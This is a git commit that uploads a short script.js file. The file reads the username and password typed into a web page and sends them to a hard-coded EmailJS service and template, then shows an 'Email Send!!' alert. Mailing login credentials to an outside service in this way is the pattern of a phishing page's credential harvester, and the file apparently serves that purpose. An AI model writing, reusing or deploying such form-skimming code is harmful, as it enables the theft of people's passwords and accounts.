323cbcd74946c82b145f2c81956653f7489819b0
Killer1P <140306826+Killer1P@users.noreply.github.com>
2025-04-25 19:25:44 +0530

    Add files via upload

---
+++ script.js
@@ -0,0 +1,8 @@
+function sendMail(){
+    let parms = {
+        username: document.getElementById("username").value,
+        password: document.getElementById("password").value,
+    }
+
+    emailjs.send("service_pugb07d", "template_vgsk61v", parms).then(alert("Email Send!!"))
+}
